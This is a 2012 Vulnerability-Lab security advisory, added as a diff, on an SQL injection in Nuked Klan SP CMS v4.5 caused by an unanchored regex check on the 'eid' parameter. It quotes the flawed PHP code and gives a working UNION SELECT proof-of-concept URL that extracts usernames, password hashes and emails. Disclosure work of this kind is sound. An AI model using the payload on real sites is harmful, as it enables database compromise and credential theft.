@@ -1,0 +1,143 @@
+Title:
+======
+Nuked Klan SP CMS v4.5 - SQL injection Vulnerability
+
+
+Date:
+=====
+2012-06-09
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=610
+
+
+VL-ID:
+=====
+610
+
+
+Common Vulnerability Scoring System:
+====================================
+8
+
+
+Introduction:
+=============
+Nuked-Klan is an open source CMS. It allows you to install and administer a website in a simple and interactive.
+It simply requires a hosting PHP / MySQL to work. Nuked-Klan is specialized in network games and clan management 
+with its version Gamer, however, a general version of SP is named.
+
+(Copy of the Vendor Homepage: http://www.nuked-klan.org/ )
+
+
+Abstract:
+=========
+The Vulnerability Laboratory Research Team discovered a critical sql vulnerability and regex ereg bypass in the Nuked Klan SP v4.5 CMS.
+
+
+Report-Timeline:
+================
+2012-06-08:  Public Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+High
+
+
+Details:
+========
+A SQL Injection vulnerability & a misconfiguration are detected in the Nuked Klan SP v4.5 Content Management System.
+The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own 
+sql commands on the affected application dbms without user inter action. Successful exploitation of the 
+vulnerability results in dbms & application compromise. The vulnerabilities are located in misconfigured 
+regex ereg condition when processing to request the eid variable.
+
+Vulnerable File(s):
+      [+] index.php
+
+Vulnerable Parameter(s):
+      [+] eid
+
+
+Proof of Concept:
+=================
+The sql injection vulnerability can be exploited by remote attackers without required user inter action.
+For demonstration or reproduce ...
+
+Before continuing to exploit, you need to know the procedure about how  "Eid" variable  is handled (behind).
+First the user is sending a GET request with "eid" as argument then it passed to the function `show_event()`. 
+Now we review the content of the file "/modules/Calendar/index.php " as example ...
+
+function show_event()
+    {
+        global $bgcolor2, $eid, $type, $d, $m, $y, $user, $nuked, $theme, $language;
+
+        if ($type == "birthday" && ereg("[a-zA-Z0-9]+$", $eid)) 
+        {
+            $sql = mysql_query("SELECT pseudo, prenom, age FROM " . USER_TABLE . " WHERE id = '" . $eid . "'");
+            list($pseudo, $prenom, $birthday) = mysql_fetch_array($sql);
+            $pseudo = stripslashes($pseudo);
+            $prenom = stripslashes($prenom);  ...
+
+This function will check if a variable contains only alpha-num characters or not, as you can see on this regex
+ereg("[a-zA-Z0-9]+$", $eid)  the programmer has forget to add begin check `^`. Remote attackers can bypass the 
+validation by adding  any own special character like  (+,--,#,% ) followed by the string to validate the above condition.
+
+PoC:
+http://127.0.0.1:80/nk/index.php?file=Calendar&nuked_nude=index&op=show_event&eid=
+0'union+select+version(),concat(pseudo,0x3a,pass,0x3a,email),3+from+nuked_users+where%20'vuln-lab'='vuln-lab&type=birthday 
+
+
+Risk:
+=====
+The security risk of the sql injection vulnerability is estimated as high.
+
+
+
+Credits:
+========
+Vulnerability Laboratory [Research Team] - Karim H.B. (kami@vulnerability-lab.com)
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. 
+
+Domains:  www.vulnerability-lab.com     - www.vuln-lab.com
+Contact:  admin@vulnerability-lab.com   - support@vulnerability-lab.com   - research@vulnerability-lab.com
+Section:  video.vulnerability-lab.com   - forum.vulnerability-lab.com     - news.vulnerability-lab.com
+Social:    twitter.com/#!/vuln_lab   - facebook.com/VulnerabilityLab   - youtube.com/user/vulnerability0lab
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
+Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
+media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and 
+other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
+modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.
+
+                Copyright © 2012 Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research@vulnerability-lab.com
